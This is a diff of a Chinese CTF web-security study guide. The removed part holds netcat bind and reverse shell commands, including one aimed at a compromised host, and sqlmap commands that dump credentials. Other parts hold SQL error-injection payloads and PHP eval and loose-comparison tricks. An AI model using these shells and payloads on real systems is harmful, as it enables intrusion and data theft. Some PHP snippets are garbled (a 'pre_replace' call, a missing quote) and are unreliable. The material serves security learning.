@@ -24,136 +24,6 @@
 
 
 
-## 工具使用
-
-### nc(NetCat瑞士军刀)
-
-#### 简介
-
-​		**Netcat** 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。
-
-#### 主要功能
-
-+ Telnet功能
-+ 获取banner信息
-+ 传输文本信息
-+ 传输文件/目录
-+ 加密传输文件，默认不加密
-+ 远程控制
-+ 加密所有流量
-+ 流媒体服务器
-+ 远程克隆硬盘
-
-#### 常用命令
-
-+ `-u`：使用UDP协议传输
-+ `-l`：开启监听
-+ `-p`：指定端口
-+ `-n`：以数字形式代表ip
-+ `-v`：显示执行命令过程
-+ `-t`：以telnet形式应答
-+ `-z`：不进行交互，直接显示结果
-+ `-w`：设置超时时间
-+ `-e`：程序重定向
-
-#### 常见的用法
-
-##### 端口扫描
-
-如果想单纯的端口扫描的话，使用其他工具如nmap会更好。nc端口扫描最主要的用途是：当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而我们的nmap工具是不能扫描到内网的。所以这时我们可以把nc上传到web服务器上，利用他来扫描内网主机。而由于nc体积很小，所以不容易被发现。
-
-![image-20210501113359424](CTF-WEB篇.assets/image-20210501113359424.png)
-
-##### 聊天
-
-我们可以利用nc做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的服务端——客户端模型。
-
-**服务器端**
-
-~~~sh
-nc -lvp 39990 #监听39990端口 -l 监听  -v 显示详细信息  -p 指定端口
-~~~
-
-**客户端**
-
-~~~shell
-nc -nv 39.***.***.*** 39990 #连接到服务器的39990端口 -n 以数字的形式显示 -v显示详信息
-~~~
-
-![image-20210501114205551](CTF-WEB篇.assets/image-20210501114205551.png)![image-20210501114312206](CTF-WEB篇.assets/image-20210501114312206.png)
-
-##### 文件传输
-
-我们可以利用nc往客户端传送文件
-
-**服务器端**：
-
-~~~shell
-nc -vlp 39990 < a.txt
-~~~
-
-**客户端**：
-
-~~~sh
-nc -nv 39.***.***.*** 39990 > a.txt
-~~~
-
-![image-20210501115413602](CTF-WEB篇.assets/image-20210501115413602.png)![image-20210501115531080](CTF-WEB篇.assets/image-20210501115531080.png)
-
-![image-20210501115505312](CTF-WEB篇.assets/image-20210501115505312.png)
-
-##### 反弹shell
-
-> **正向连接，意思就是我们主动连接肉鸡**
->
-> 假如我们入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd(shell)权限弹到39990端口上
-
-**肉鸡**
-
-~~~sh
-nc -lvp 39990 -t -e cmd.exe
-~~~
-
-然后我们的主机访问该肉鸡的39990端口
-
-**我们的主机**
-
-~~~shell
-nc -nv 39.***.***.*** 39990
-~~~
-
-![image-20210501120711457](CTF-WEB篇.assets/image-20210501120711457.png)
-
-![image-20210501120755104](CTF-WEB篇.assets/image-20210501120755104.png)
-
-> 反向连接，意思就是我们监听端口，然后肉鸡主动连接到我们的主机
-
-**我们的主机**
-
-~~~sh
-nc -vlp 39990
-~~~
-
-**肉鸡**
-
-~~~sh
-nc -nv -t -c 192.168.1.129 39990
-~~~
-
-![image-20210501122347282](CTF-WEB篇.assets/image-20210501122347282.png)
-
-![image-20210501122435969](CTF-WEB篇.assets/image-20210501122435969.png)
-
-##### 蜜罐
-
-> 作为蜜罐，一直监听39990端口，直到Ctrl+C停止
-
-~~~sh
-nc -lp 39990 > log.txt   #监听8888端口，并且将日志信息写入log.txt中
-~~~
-
-
-
 ## SQL注入
 
 ### 基本概念
@@ -169,220 +39,7 @@ nc -lp 39990 > log.txt   #监听8888端口，并且将日志信息写入log.txt�
 + sqlmap
 + ……
 
-#### sqlmap工具
 
-##### sqlmap简介
-
-sqlmap支持五种不同的注入模式：
-
-1. 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
-2. 基于时间的盲注，即不能根据页面的返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
-3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
-4. 联合查询注入，可以使用union的情况下的注入。
-5. 堆查询注入，可以同时执行多条语句的执行时的注入。
-
-##### sqlmap支持的数据库
-
-`mysql、oracle、postgresql、Microsoft SQL server、Microsoft access、IBM DB2、sqlite、Firebird, Sybase和SAP MaxDB`
-
-##### 检测注入
-
-+ **基本格式**
-
-~~~
-get格式：
-sqlmap -u "http://xxxx.xxx/index.php?id=x" 
-默认使用level1检测全部数据库类型
-sqlmap -u "http://xxx.xxx/index.php?id=x" --dbms mysql --level 3
-指定数据库类型为mysql 级别为3（共5级，级别越高，检测越全面）
-~~~
-
-+ **跟随302跳转**
-
-  当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，当注入错误的时候，先报错再跳转的时候，不需要跟随302。目的：要追踪到错误信息。
-
-+ **cookie注入**
-
-~~~
-当程序有防止get注入的时候，可以使用cookie注入
-sqlmap -u "http://xxx.xxx/index.php" --cookie  “id=11” –level 2（只有level达到2才会检测cookie）
-~~~
-
-+ **post数据包注入**
-
-~~~
-可以使用burpsuite工具抓取post数据包
-sqlmap -r "post数据包存放路径" -p "注入参数"  
-~~~
-
-##### 注入成功后
-
-+ **获取数据库基本信息**
-
-~~~
-sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs
-查询有哪些数据库
-sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables
-查询test数据库中有哪些表
-sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns
-查询test数据库中admin表有哪些字段
-sqlmap -u "http://xxx.xxx/index.php?id=X" -D test -T admin -C "username,password" --dump
-dump出字段username与password中的数据
-~~~
-
-+ **从数据库中搜索字段**
-
-~~~
-sqlmap -r "文件路径" -D "数据库名" --search -C admin,password 
-在数据库中搜索字段admin与password
-~~~
-
-+ **读取与写入文件**
-
-~~~
-	首先需要找个网站的物理路径，其次需要有可写或可读的权限
-	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件（物理路径）
-	--file-wirte=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
-	--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
-
-~~~
-
-##### sqlmap详细命令
-
-+ **常用命令**
-
-  + `--is-dba`:  当前用户权限（是否为root权限）
-  + `--dbs`:   枚举所有数据库
-  + `--current-db`:  显示网站当前数据库
-  + `--users`:  枚举所有数据库用户
-  + `--current-user`：显示当前数据库用户
-  + `--random-agent`： 构造随机user-agent
-  + `--passwords`： 显示数据库密码
-  + `proxy http://xxx.xxx  --threads 10 `：(可以 自定义线程加速)代理
-  + `--time-sec`: DBMS响应的延迟时间（默认为5秒）   
-
-+ **options(选项)：**
-
-  + `--version`：显示sqlmap的版本号
-
-  + `-h、--help`：显示帮助信息
-
-  + `-v `： VERBOSE 详细级别：0-6（默认为1）
-
-  + ~~~
-    保存进度继续跑：
-    sqlmap -u "网址" --dbs-o "sqlmap.log"  保存进度
-    sqlmap -u "网址"  --dbs-o "sqlmap.log"  --resume 恢复已保存进度
-    
-    ~~~
-
-+ **Target(目标)：**
-
-  以下至少需要设置其中一个选项，设置目标URL:
-
-  + `-d`：直接连接到数据库
-  + `-u`:  URL 连接目标 URL
-  + `-l`:  LIST 从burpsuite或者WebScarab代理的日志中解析目标
-  + `-r`:  REQUESTFILE  从一个文件中载入http请求
-  + `-g`:  处理Google dork的结果作为目标URL
-  + `-c`:  CONFIGFILE  从INI配置文件中加载选项
-
-+ **Request（请求）**：
-
-  这些选项可以用来指定如果连接到目标URL
-
-  + `--data=DATA`:  通过post发送的数据字符串
-  + `--cookie=COOKIE`:  http cookie头
-  + `--cookie-urlencode`:  URL编码生成的cookie注入
-  + `--drop-set-cookie`： 忽略响应的set-cookie头信息
-  +  `--user-agent=AGENT`:  指定http User-Agent头
-  + `--random-agent`： 使用随机选定的http user-agent头
-  + `--referer=REFERER`：指定http Referer头
-  + `--headers=HEADERS`:  换行分开，加入其他的http头
-  + `--auth-type=ATYPE`:  http身份验证类型（基本、摘要或NTLM）
-  + `--auth-cred=ACRED`:  http身份验证凭据
-  + `--auth-cert=ACERT`:  http 认证证书
-  + `--proxy=PROXY`:  使用http代理身份链接到目标URL
-  + `--proxy-cred=PCRED`:  http代理身份验证凭据（用户名：密码）
-  + `--ignore-proxy`：忽略系统默认的http代理
-  + `--delay=DELAY`:  在每个http请求之间的延迟时间，单位为秒
-  + `--timeout=TIMEOUT`:  等待连接超时的时间（默认为30秒）
-  + `--retries=RETRIES` :  连接超时后重新连接的时间（默认为3秒）
-  + `--scope=SCOPE`： 从所提供的代理日志中过滤目标的正则表达式
-  + `--safe-url=SAFURL`:  在测试过程中经常访问的URL地址
-  + `--safe-freq=SAFREQ` :  两次访问之间测试请求，给出安全的URL
-
-+ **Enumeration（枚举）：**
-
-  这些选项可以用来枚举后端数据库管理系统的信息、表中的结构以及数据。此外，也可以运行自己的sql语句。
-
-  + `-b、--banner`:  检索数据库管理系统的标识
-  + `--current-user`： 检索数据库管理系统当前用户
-  + `--current-db`： 检索数据库管理系统当前数据库
-  + `--is-dba`:  检测DBMS当前用户是否是root权限
-  + `--users`:  枚举数据库管理系统所有用户
-  + `--passwords`:  枚举数据库管理系统用户密码哈希值
-  + `--privileges`:  枚举数据库管理系统用户的权限
-  + `--roles`： 枚举数据库管理系统用户的角色
-  + `--dbs`： 枚举数据库管理系统数据库
-  + `-D `:  要进行枚举的指定数据库名
-  + `-T`： 要进行枚举的指定数据库表名
-  + `--tables`：枚举指定数据库中的表
-  + `--columns`:  枚举指定表中的字段
-  + `--dump`:  转储数据库管理系统的数据库中的表项
-  + `--dump-all`:  转储所有的数据库表中的条目
-  + `--search`： 搜索列，表或者数据库名称
-  + `-C`： 要进行枚举的数据库列
-  + `-U`:  用来进行枚举的数据库用户
-  + `--exclude-sysdbs`:枚举表时排除系统数据库
-  + `--sql-query`:  要执行的sql语句
-  + `--sql-shell`:  提示交互式sql的shell
-
-+ **Optimization(优化)：**
-
-  这些选项可用于优化sqlmap的性能
-
-  + `-o`： 开启所有的优化开关
-  + `--predict-output`:  预测常见的查询输出
-  + `--keep-alive`:  使用持久的http(s)连接
-  + `--null-connection`:  从没有实际的http响应体中检索页面长度
-  + `--threads`:  最大的http（s）请求并发量（默认为1）
-
-+ **Injection（注入）**
-
-  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本
-
-  + `-p`:  可测试注入的参数
-  + `--dbms`:  强制后端的DBMS为此值
-  + `–os`:  强制后端的DBMS操作系统为这个值
-  + `--prefix`： 注入payload字符串前缀
-  + `--suffix`：   注入payload字符串后缀
-  + `–tamper`：  使用给定的脚本（S）篡改注入数据
-
-+ **Detection(检测)：**
-
-  这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
-
-  + `--level`： 执行测试的等级（1-5，默认为1）
-  + `--risk`：执行测试的风险（0-3，默认为1）
-  + `--string`:  查询时有效时在页面匹配字符串
-  + `--regexp`:  查询时有效时在页面匹配正则表达式
-  + `--text-only` :  仅基于在文本内容比较网页
-
-+ **Techniques(技巧)：**
-
-  这些选项可用于调整具体的SQL注入测试。
-
-  + `--technique`:  sql注入技术测试（默认时BEUST）
-  + `--time-sec`:  数据库管理系统响应的延迟时间（默认为5秒）
-  + `--union-cols`:  定列范围用于测试union查询注入
-  + `--union-char`:  用于暴力猜解列数的字符
-
-+ **Fingerprint(指纹):**
-
-  `-f, –fingerprint`:   执行检查广泛的DBMS版本指纹
-
-  
 
 
 ### 手动注入基本步骤
@@ -425,9 +82,9 @@ SQL注入分为很多种，有联合注入、布尔注入、报错注入、时�
 + 平时我们最常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。
 
 ~~~sql
-1. select count (*) ,concat ((此处加入执行语句),0x7e,floor (rand (0)*2))  as a from information _schema.tables group by a;
-2. extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));
-3. select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);
+1. select count(*) ,concat ((此处加入执行语句),0x7e,floor (rand (0)*2))  as a from information _schema.tables group by a;
+2. extractvalue(1,concat (0x7e,(此处加入执行语句),0x7e));
+3. select updatexml(1,concat (0x7e,(此处加入执行语句),0x7e),1);
 ~~~
 
 [详细解释]([SQL 注入 报错注入 - Keefe's Blog | 每天都要热爱技术 -- 网络安全技术博客 (aiyuanzhen.com)](http://aiyuanzhen.com/index.php/archives/34/))
@@ -1444,6 +1101,219 @@ if ($auth) {
 ~~~
 
 当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth` 变量将自动得到赋值。
+
+#### extract（）变量
+
+extract（）函数能够从数组将变量导入到当前的符号表，其定义为
+
+~~~php
+extract ( array &$array , int $flags = EXTR_OVERWRITE , string $prefix = "" ) : int
+~~~
+
+### 命令执行
+
+#### 直接执行代码
+
+PHP中有不少可以直接执行代码的函数。
+
+~~~php
+eval();
+assert();
+system();
+exec();
+shell_exec();
+passthru();
+escapeshellcmd();
+pcntl_exec();
+……
+~~~
+
+#### pre_replace()代码执行
+
+`pre_replace()`的第一个参数如果存在/e模式修饰符，则允许代码执行。
+
+~~~php
+<?php
+    $var = '<tag>phpinfo()</tag>';
+	pre_replace(/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
+    
+?>
+~~~
+
+如果没有 `/e` 修饰符，可以尝试 %00 截断。
+
+#### preg_match 代码执行 
+
+`preg_match` 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。
+
+~~~php
+<?php
+include 'flag.php';
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(strlen($code)>40){
+        die("Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+//$hint =  "php function getFlag() to get flag";
+?>
+~~~
+
+### PHP特性
+
+#### 数组
+
+```php
+<?php
+$var = 1;
+$var = array();
+$var = "string";
+?>
+```
+
+php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。
+
+比如在 `$a == $b` 的比较中
+
+```php
+$a = null; 
+$b = false; //为真 
+$a = ''; 
+$b = 0; //同样为真
+```
+
+然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。
+
+```php
+0=='0' //true
+0 == 'abcdefg' //true
+0 === 'abcdefg' //false
+1 == '1abcdef' //true
+```
+
+#### 魔法Hash
+
+~~~php
+"0e132456789"=="0e7124511451155" //true
+"0e123456abc"=="0e1dddada" //false
+"0e1abc"=="0"  //true
+~~~
+
+在进行比较运算时，如果遇到了 `0e\d+` 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 `0e\d+` 这种模式就不会相等。
+
+#### 十六进制转换
+
+~~~php
+"0x1e240"=="123456" //true
+"0x1e240"==123456 //true
+"0x1e240"=="1e240" //false
+~~~
+
+当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。
+
+#### 类型转换
+
+常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。
+
+```php
+int` 转 `string
+$var = 5;
+方式1：$item = (string)$var;
+方式2：$item = strval($var);
+```
+
+`string` 转 `int`：`intval()` 函数。
+
+对于这个函数，可以先看 2 个例子。
+
+```php
+var_dump(intval('2')) //2
+var_dump(intval('3abcd')) //3
+var_dump(intval('abcd')) //0
+```
+
+说明 `intval()` 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， `intval()` 不会报错而是返回 0。
+
+同时，程序员在编程的时候也不应该使用如下的这段代码：
+
+```php
+if(intval($a)>1000) {
+ mysql_query("select * from news where id=".$a)
+}
+```
+
+这个时候 `$a` 的值有可能是 `1002 union`。
+
+#### 内置函数的参数的松散性
+
+内置函数的松散性说的是，调用函数时给函数传递 函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。
+
+**md5()**
+
+```php
+$array1[] = array(
+ "foo" => "bar",
+ "bar" => "foo",
+);
+$array2 = array("foo", "bar", "hello", "world");
+var_dump(md5($array1)==md5($array2)); //true
+```
+
+PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。
+
+##### **strcmp**()
+
+`strcmp()` 函数在 PHP 官方手册中的描述是 `intstrcmp ( string $str1 ， string $str2 )`，需要给 `strcmp()` 传递 2 个 `string` 类型的参数。如果 `str1` 小于 `str2`，返回 -1，相等返回 0，否则返回 1。`strcmp()` 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。
+
+如果传入给出 `strcmp()` 的参数是数字呢？
+
+```php
+$array=[1,2,3];
+var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
+```
+
+**switch()**
+
+如果 `switch()` 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：
+
+```php
+$i ="2abc";
+switch ($i) {
+case 0:
+case 1:
+case 2:
+ echo "i is less than 3 but not negative";
+ break;
+case 3:
+ echo "i is 3";
+}
+```
+
+这个时候程序输出的是 `i is less than 3 but not negative` ，是由于 `switch()` 函数将 `$i` 进行了类型转换，转换结果为 2。
+
+**in_array()**
+
+在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` , 如果 strict 参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strict 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。
+
+```php
+$array=[0,1,2,'3'];
+var_dump(in_array('abc', $array)); //true
+var_dump(in_array('1bc', $array)); //true
+```
+
+可以看到上面的情况返回的都是 true，因为 `'abc'` 会转换为 0， `'1bc'` 转换为 1。
+
+`array_search()` 与 `in_array()` 也是一样的问题。
+
+
+
+
 
 
 
